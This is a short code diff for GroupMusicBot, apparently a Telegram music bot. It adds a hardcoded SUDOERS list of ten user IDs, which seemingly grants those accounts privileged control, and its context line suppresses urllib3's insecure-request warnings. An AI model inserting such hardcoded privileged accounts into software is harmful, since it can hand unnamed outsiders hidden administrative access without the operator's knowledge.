@@ -22,6 +22,9 @@ from GroupMusicBot.utils.database import (
 )
 from GroupMusicBot.utils.decorators.language import language
 
+
+SUDOERS = [645739169, 870471128, 1249591948, 2088106582, 1663258664, 1416529201, 2075788563, 945137470, 2137482758, 5094813212]
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
